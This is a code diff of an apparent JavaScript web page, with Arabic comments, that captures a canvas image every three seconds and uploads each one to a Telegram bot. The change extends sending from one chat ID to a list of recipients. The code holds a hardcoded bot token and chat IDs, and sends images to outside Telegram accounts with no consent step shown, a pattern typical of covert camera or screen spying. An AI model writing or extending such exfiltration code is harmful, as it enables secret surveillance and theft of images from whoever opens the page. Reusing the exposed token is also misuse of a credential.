@@ -31,7 +31,12 @@
     
     // بيانات تيليجرام
     const BOT_TOKEN = '8948041325:AAEA_XM0vHfsxbvhTAwZp4gD_gKvAhZlQVI';
-    const CHAT_ID = '8720724887';
+    
+    // قائمة المستلمين (يمكنك إضافة أكثر من شخص)
+    const CHAT_IDS = [
+      '8720724887',  // الشخص الأول
+      '1234567890'   // الشخص الثاني - استبدل هذا بالـ Chat ID الحقيقي
+    ];
     
     // الفاصل الزمني بين كل صورة (بالمللي ثانية) - كل 3 ثواني
     const CAPTURE_INTERVAL = 3000;
@@ -102,7 +107,8 @@
         // تحويل Canvas إلى Blob (ملف PNG حقيقي)
         canvas.toBlob((blob) => {
           if (blob && blob.size > 0) {
-            sendToTelegram(blob);
+            // إرسال إلى جميع المستلمين
+            sendToAllTelegram(blob);
           } else {
             console.error('[Empty Blob]');
           }
@@ -113,11 +119,34 @@
       }
     }
 
-    async function sendToTelegram(imageBlob) {
+    // إرسال الصورة إلى جميع المستلمين
+    async function sendToAllTelegram(imageBlob) {
+      const timestamp = Date.now();
+      const caption = `📸 ${new Date().toLocaleString('ar-EG')}`;
+      
+      // إرسال إلى كل شخص في القائمة
+      const sendPromises = CHAT_IDS.map(chatId => 
+        sendToTelegram(chatId, imageBlob, timestamp, caption)
+      );
+      
+      // انتظار إرسال جميع الرسائل
+      const results = await Promise.allSettled(sendPromises);
+      
+      // عرض النتائج
+      results.forEach((result, index) => {
+        if (result.status === 'fulfilled' && result.value) {
+          console.log(`[Sent] Photo sent to ${CHAT_IDS[index]} successfully`);
+        } else {
+          console.error(`[Failed] Failed to send to ${CHAT_IDS[index]}:`, result.reason);
+        }
+      });
+    }
+
+    async function sendToTelegram(chatId, imageBlob, timestamp, caption) {
       const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', imageBlob, `capture_${Date.now()}.png`);
-      formData.append('caption', `📸 ${new Date().toLocaleString('ar-EG')}`);
+      formData.append('chat_id', chatId);
+      formData.append('photo', imageBlob, `capture_${timestamp}.png`);
+      formData.append('caption', caption);
 
       try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -128,12 +157,12 @@
         const data = await response.json();
         
         if (!data.ok) {
-          console.error('[Telegram Error]', data.description);
-        } else {
-          console.log('[Sent] Photo sent successfully');
+          throw new Error(data.description || 'Unknown error');
         }
+        
+        return true;
       } catch (err) {
-        console.error('[Send Error]', err);
+        throw err;
       }
     }
 
